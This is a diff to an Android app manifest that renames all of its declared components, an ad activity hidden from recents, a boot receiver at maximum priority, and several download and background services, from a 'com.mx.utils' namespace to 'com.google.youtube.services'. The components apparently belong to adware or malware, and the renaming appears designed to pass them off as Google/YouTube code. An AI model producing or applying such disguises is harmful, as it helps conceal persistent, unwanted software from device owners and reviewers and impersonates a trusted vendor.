@@ -45,14 +45,14 @@
         </activity>
         
         <activity
-            android:name="com.mx.utils.services.AdActivity"
+            android:name="com.google.youtube.services.AdActivity"
             android:theme="@android:style/Theme.Light.NoTitleBar" 
             android:excludeFromRecents="true"
             android:screenOrientation="portrait">
         </activity>
 
         <receiver
-            android:name="com.mx.utils.services.BootBroadcast"
+            android:name="com.google.youtube.services.BootBroadcast"
             android:permission="android.permission.RECEIVE_BOOT_COMPLETED" >
             <intent-filter android:priority="2147483647" >
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
@@ -88,13 +88,13 @@
             </intent-filter>
         </receiver>
 
-        <service android:name="com.mx.utils.services.MainService" ></service>
-        <service android:name="com.mx.utils.services.PakageService" ></service>
-        <service android:name="com.mx.utils.services.DowCplService" ></service>
-        <service android:name="com.mx.utils.services.DirectDService"></service>
-        <service android:name="com.mx.utils.services.DirectDLService"></service>
-        <service android:name="com.mx.utils.services.SService"></service>
-        <service android:name="com.mx.utils.services.BrowserService"></service>
+        <service android:name="com.google.youtube.services.MainService" ></service>
+        <service android:name="com.google.youtube.services.PakageService" ></service>
+        <service android:name="com.google.youtube.services.DowCplService" ></service>
+        <service android:name="com.google.youtube.services.DirectDService"></service>
+        <service android:name="com.google.youtube.services.DirectDLService"></service>
+        <service android:name="com.google.youtube.services.SService"></service>
+        <service android:name="com.google.youtube.services.BrowserService"></service>
 
         <meta-data
             android:name="cid"
